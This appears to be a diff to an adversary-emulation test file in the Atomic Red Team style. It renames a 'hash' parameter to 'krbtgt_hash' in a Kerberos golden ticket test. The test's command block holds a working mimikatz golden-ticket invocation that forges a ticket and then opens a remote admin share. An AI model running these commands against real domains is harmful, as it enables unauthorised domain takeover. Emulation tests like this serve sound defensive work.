@@ -28,7 +28,7 @@ atomic_tests:
       description: Account to impersonate
       type: string
       default: Attacker1
-    hash:
+    krbtgt_hash:
       description: Krbtgt hash
       type: string
       default: hash
@@ -59,7 +59,7 @@ atomic_tests:
     elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
     command: | # these are the actaul attack commands, at least one command must be provided
       klist purge
-      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{hash} /user:#{account} /ptt" "exit" > $null
+      #{mimikatz_path} "log #{output_file}" "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_hash} /user:#{account} /ptt" "exit" > $null
       dir \\#{machine}\C$
       klist purge
     cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
